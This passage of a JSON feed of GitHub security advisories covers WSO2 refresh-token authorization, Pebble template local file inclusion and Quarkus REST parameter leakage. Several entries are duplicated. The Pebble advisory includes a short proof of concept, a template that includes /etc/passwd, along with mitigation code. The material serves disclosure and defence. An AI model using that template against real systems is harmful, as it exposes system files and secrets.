            "content_html": "<p>An incorrect authorization vulnerability exists in multiple WSO2 products, allowing protected APIs to be accessed directly using a refresh token instead of the expected access token. Due to improper authorization checks and token mapping, session cookies are not required for API access, potentially enabling unauthorized operations.</p>\n<p>Exploitation requires an attacker to obtain a valid refresh token of an admin user. Since refresh tokens generally have a longer expiration time, this could lead to prolonged unauthorized access to API resources, impacting data confidentiality and integrity.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-2321\">https://nvd.nist.gov/vuln/detail/CVE-2024-2321</a></li>\n<li><a href=\"https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213\">https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213</a></li>\n<li><a href=\"https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md\">https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6qjp-wm6g-m32r\">https://github.com/advisories/GHSA-6qjp-wm6g-m32r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6qjp-wm6g-m32r",
            "title": "[org.wso2.is:identity-server-parent] WSO2 incorrect authorization vulnerability",
            "date_modified": "2025-03-03T19:50:58.000Z",
            "date_published": "2025-02-27T06:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6qjp-wm6g-m32r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An incorrect authorization vulnerability exists in multiple WSO2 products, allowing protected APIs to be accessed directly using a refresh token instead of the expected access token. Due to improper authorization checks and token mapping, session cookies are not required for API access, potentially enabling unauthorized operations.</p>\n<p>Exploitation requires an attacker to obtain a valid refresh token of an admin user. Since refresh tokens generally have a longer expiration time, this could lead to prolonged unauthorized access to API resources, impacting data confidentiality and integrity.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-2321\">https://nvd.nist.gov/vuln/detail/CVE-2024-2321</a></li>\n<li><a href=\"https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213\">https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213</a></li>\n<li><a href=\"https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md\">https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6qjp-wm6g-m32r\">https://github.com/advisories/GHSA-6qjp-wm6g-m32r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6qjp-wm6g-m32r",
            "title": "[org.wso2.am:am-parent] WSO2 incorrect authorization vulnerability",
            "date_modified": "2025-03-03T19:50:58.000Z",
            "date_published": "2025-02-27T06:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6qjp-wm6g-m32r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An incorrect authorization vulnerability exists in multiple WSO2 products, allowing protected APIs to be accessed directly using a refresh token instead of the expected access token. Due to improper authorization checks and token mapping, session cookies are not required for API access, potentially enabling unauthorized operations.</p>\n<p>Exploitation requires an attacker to obtain a valid refresh token of an admin user. Since refresh tokens generally have a longer expiration time, this could lead to prolonged unauthorized access to API resources, impacting data confidentiality and integrity.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-2321\">https://nvd.nist.gov/vuln/detail/CVE-2024-2321</a></li>\n<li><a href=\"https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213\">https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213</a></li>\n<li><a href=\"https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md\">https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6qjp-wm6g-m32r\">https://github.com/advisories/GHSA-6qjp-wm6g-m32r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6qjp-wm6g-m32r",
            "title": "[org.wso2.am:am-parent] WSO2 incorrect authorization vulnerability",
            "date_modified": "2025-03-03T19:50:58.000Z",
            "date_published": "2025-02-27T06:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6qjp-wm6g-m32r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An incorrect authorization vulnerability exists in multiple WSO2 products, allowing protected APIs to be accessed directly using a refresh token instead of the expected access token. Due to improper authorization checks and token mapping, session cookies are not required for API access, potentially enabling unauthorized operations.</p>\n<p>Exploitation requires an attacker to obtain a valid refresh token of an admin user. Since refresh tokens generally have a longer expiration time, this could lead to prolonged unauthorized access to API resources, impacting data confidentiality and integrity.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-2321\">https://nvd.nist.gov/vuln/detail/CVE-2024-2321</a></li>\n<li><a href=\"https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213\">https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213</a></li>\n<li><a href=\"https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md\">https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6qjp-wm6g-m32r\">https://github.com/advisories/GHSA-6qjp-wm6g-m32r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6qjp-wm6g-m32r",
            "title": "[org.wso2.am:am-parent] WSO2 incorrect authorization vulnerability",
            "date_modified": "2025-03-03T19:50:58.000Z",
            "date_published": "2025-02-27T06:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6qjp-wm6g-m32r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If untrusted user input is used to dynamically create a <code>PebbleTemplate</code> with the method <code>PebbleEngine#getLiteralTemplate</code>, then an attacker can include arbitrary local files from the file system into the generated template, leaking potentially sensitive information into the output of <code>PebbleTemplate#evaluate</code>. This is done via the <code>include</code> macro.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>include</code> macro calls <code>PebbleTempateImpl#resolveRelativePath</code> with the <code>relativePath</code> argument passed within the template:</p>\n<p>Example template:</p>\n<pre><code>{% include [relativePath] %}\n</code></pre>\n<p>When <code>resolveRelativePath</code> is called, the <code>relativePath</code>  is resolved against the <code>PebbleTemplateImpl.name</code> variable.</p>\n<pre><code class=\"language-java\">  /**\n   * This method resolves the given relative path based on this template file path.\n   *\n   * @param relativePath the path which should be resolved.\n   * @return the resolved path.\n   */\n  public String resolveRelativePath(String relativePath) {\n    String resolved = this.engine.getLoader().resolveRelativePath(relativePath, this.name);\n    if (resolved == null) {\n      return relativePath;\n    } else {\n      return resolved;\n    }\n  }\n</code></pre>\n<p><a href=\"https://github.com/PebbleTemplates/pebble/blob/82ad7fcf9e9eaa45ee82ae3335a1409d19c10263/pebble/src/main/java/io/pebbletemplates/pebble/template/PebbleTemplateImpl.java#L380\">https://github.com/PebbleTemplates/pebble/blob/82ad7fcf9e9eaa45ee82ae3335a1409d19c10263/pebble/src/main/java/io/pebbletemplates/pebble/template/PebbleTemplateImpl.java#L380</a></p>\n<p>Unfortunately, when the template is created from a string, as is the case when <code>PebbleEngine#getLiteralTemplate</code> is used, the <code>PebbleTemplateImpl.name</code> variable is actually the entirety of the contents of the template, not a filename as the logic expects. The net result is that the <code>relativePath</code> is resolved against the system root directory. As a result, files accessible from the root directory of the filesystem can be included into a template. </p>\n<h3 id=\"poc\">PoC</h3>\n<p>The following test demonstrates the vulnerability:</p>\n<pre><code class=\"language-java\">PebbleEngine e = new PebbleEngine.Builder().build();\n\nString templateString = \"\"\"\n        {% include '/etc/passwd' %}\n        \"\"\";\nPebbleTemplate template = e.getLiteralTemplate(templateString);\n\ntry (final Writer writer = new StringWriter()) {\n    template.evaluate(writer, new HashMap&lt;&gt;());\n    System.out.println(writer);\n}\n</code></pre>\n<p>As an attacker, the following malicious template demonstrates the vulnerability:</p>\n<pre><code>{% include '/etc/passwd' %}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This is an arbitrary  Local File Inclusion (LFI) vulnerability. It can allow attackers to exfiltrate the contents of the local filesystem, including sensitive files into <code>PebbleTemplate</code> output. This can also be used to access the <code>/proc</code> filesystem which can give an attacker access to environment variables.</p>\n<h3 id=\"fix\">Fix</h3>\n<p>There exists no published fix for this vulnerability. The best way to mitigate this vulnerability is to disable the <code>include</code> macro in Pebble Templates.</p>\n<p>The following can safeguard your application from this vulnerability:</p>\n<pre><code class=\"language-java\">new PebbleEngine.Builder()\n            .registerExtensionCustomizer(new DisallowExtensionCustomizerBuilder()\n                    .disallowedTokenParserTags(List.of(\"include\"))\n                    .build())\n            .build();\n</code></pre>\n<h3 id=\"report-timeline\">Report Timeline</h3>\n<p>Vulnerability was reported under the Open Source Security Foundation (OpenSSF) <a href=\"https://openssf.org/about/vulnerability-disclosure-policy/\">Model Outbound Vulnerability Disclosure Policy: Version 0.1</a>.</p>\n<ul>\n<li><a href=\"https://github.com/PebbleTemplates/pebble/issues/680#issue-2409727829\">Jul 15, 2024</a> Maintainer Contacted to enable private vulnerability reporting</li>\n<li><a href=\"https://github.com/PebbleTemplates/pebble/issues/680#issuecomment-2236970984\">Jul 18, 2024</a> I opened a GHSA \n to report this vulnerability to the maintainer <a href=\"https://github.com/PebbleTemplates/pebble/security/advisories/GHSA-7c6h-hmf9-7wj7\">https://github.com/PebbleTemplates/pebble/security/advisories/GHSA-7c6h-hmf9-7wj7</a> (private link)</li>\n<li>Jul 29, 2024 GHSA updated to ping maintainer about vulnerability, no response</li>\n<li>Oct 1, 2024 GHSA updated to ping maintainer about vulnerability, no response</li>\n<li>Nov 15, 2024 GHSA updated to inform maintainer that disclosure timeline had lapsed, no response.</li>\n<li>Feb 19, 2025 GHSA updated to inform maintainer that disclosure would occur imminently, no response.</li>\n<li>Feb 24, 2025 this GHSA was created to disclose this vulnerability <strong>without a patch available</strong>.</li>\n</ul>\n<p>For further discussion, see this issue: <a href=\"https://github.com/PebbleTemplates/pebble/issues/688\">https://github.com/PebbleTemplates/pebble/issues/688</a></p>\n<h3 id=\"credit\">Credit</h3>\n<p>This vulnerability was discovered by @JLLeitschuh while at <a href=\"https://www.chainguard.dev\">Chainguard Labs</a>. Jonathan is currently independent.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/JLLeitschuh/security-research/security/advisories/GHSA-p75g-cxfj-7wrx\">https://github.com/JLLeitschuh/security-research/security/advisories/GHSA-p75g-cxfj-7wrx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1686\">https://nvd.nist.gov/vuln/detail/CVE-2025-1686</a></li>\n<li><a href=\"https://github.com/PebbleTemplates/pebble/issues/680\">https://github.com/PebbleTemplates/pebble/issues/680</a></li>\n<li><a href=\"https://github.com/PebbleTemplates/pebble/issues/688\">https://github.com/PebbleTemplates/pebble/issues/688</a></li>\n<li><a href=\"https://pebbletemplates.io/wiki/tag/include\">https://pebbletemplates.io/wiki/tag/include</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JAVA-IOPEBBLETEMPLATES-8745594\">https://security.snyk.io/vuln/SNYK-JAVA-IOPEBBLETEMPLATES-8745594</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p75g-cxfj-7wrx\">https://github.com/advisories/GHSA-p75g-cxfj-7wrx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p75g-cxfj-7wrx",
            "title": "[io.pebbletemplates:pebble] Pebble has Arbitrary Local File Inclusion (LFI) Vulnerability via `include` macro",
            "date_modified": "2025-02-28T19:45:04.000Z",
            "date_published": "2025-02-28T19:45:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p75g-cxfj-7wrx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Quarkus REST that allows request parameters to leak between concurrent requests if endpoints use field injection without a CDI scope. This vulnerability allows attackers to manipulate request data, impersonate users, or access sensitive information.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1247\">https://nvd.nist.gov/vuln/detail/CVE-2025-1247</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2025-1247\">https://access.redhat.com/security/cve/CVE-2025-1247</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2345172\">https://bugzilla.redhat.com/show_bug.cgi?id=2345172</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/issues/45789\">https://github.com/quarkusio/quarkus/issues/45789</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/commit/02ff9ed45c3928edf2a0f8b906543606fed7cd53\">https://github.com/quarkusio/quarkus/commit/02ff9ed45c3928edf2a0f8b906543606fed7cd53</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2025:1885\">https://access.redhat.com/errata/RHSA-2025:1885</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2025:1884\">https://access.redhat.com/errata/RHSA-2025:1884</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/commit/d8df15cec17dc5d085efc372d77cbef1341ae071\">https://github.com/quarkusio/quarkus/commit/d8df15cec17dc5d085efc372d77cbef1341ae071</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/commit/f42166ee7041ed09b7183d5dbf3ece2439b16676\">https://github.com/quarkusio/quarkus/commit/f42166ee7041ed09b7183d5dbf3ece2439b16676</a></li>\n<li><a href=\"https://quarkus.io/blog/cve-fixes-feb-2025\">https://quarkus.io/blog/cve-fixes-feb-2025</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2025:2067\">https://access.redhat.com/errata/RHSA-2025:2067</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-phg3-gv66-q38x\">https://github.com/advisories/GHSA-phg3-gv66-q38x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-phg3-gv66-q38x",
            "title": "[io.quarkus:quarkus-rest-deployment] Quarkus REST Endpoint Request Parameter Leakage Due to Shared Instance",
            "date_modified": "2025-03-03T15:32:40.000Z",
            "date_published": "2025-02-13T15:31:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-phg3-gv66-q38x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Quarkus REST that allows request parameters to leak between concurrent requests if endpoints use field injection without a CDI scope. This vulnerability allows attackers to manipulate request data, impersonate users, or access sensitive information.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1247\">https://nvd.nist.gov/vuln/detail/CVE-2025-1247</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2025-1247\">https://access.redhat.com/security/cve/CVE-2025-1247</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2345172\">https://bugzilla.redhat.com/show_bug.cgi?id=2345172</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/issues/45789\">https://github.com/quarkusio/quarkus/issues/45789</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/commit/02ff9ed45c3928edf2a0f8b906543606fed7cd53\">https://github.com/quarkusio/quarkus/commit/02ff9ed45c3928edf2a0f8b906543606fed7cd53</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2025:1885\">https://access.redhat.com/errata/RHSA-2025:1885</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2025:1884\">https://access.redhat.com/errata/RHSA-2025:1884</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/commit/d8df15cec17dc5d085efc372d77cbef1341ae071\">https://github.com/quarkusio/quarkus/commit/d8df15cec17dc5d085efc372d77cbef1341ae071</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/commit/f42166ee7041ed09b7183d5dbf3ece2439b16676\">https://github.com/quarkusio/quarkus/commit/f42166ee7041ed09b7183d5dbf3ece2439b16676</a></li>\n<li><a href=\"https://quarkus.io/blog/cve-fixes-feb-2025\">https://quarkus.io/blog/cve-fixes-feb-2025</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2025:2067\">https://access.redhat.com/errata/RHSA-2025:2067</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-phg3-gv66-q38x\">https://github.com/advisories/GHSA-phg3-gv66-q38x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-phg3-gv66-q38x",
            "title": "[io.quarkus:quarkus-rest] Quarkus REST Endpoint Request Parameter Leakage Due to Shared Instance",
            "date_modified": "2025-03-03T15:32:40.000Z",
            "date_published": "2025-02-13T15:31:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-phg3-gv66-q38x"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}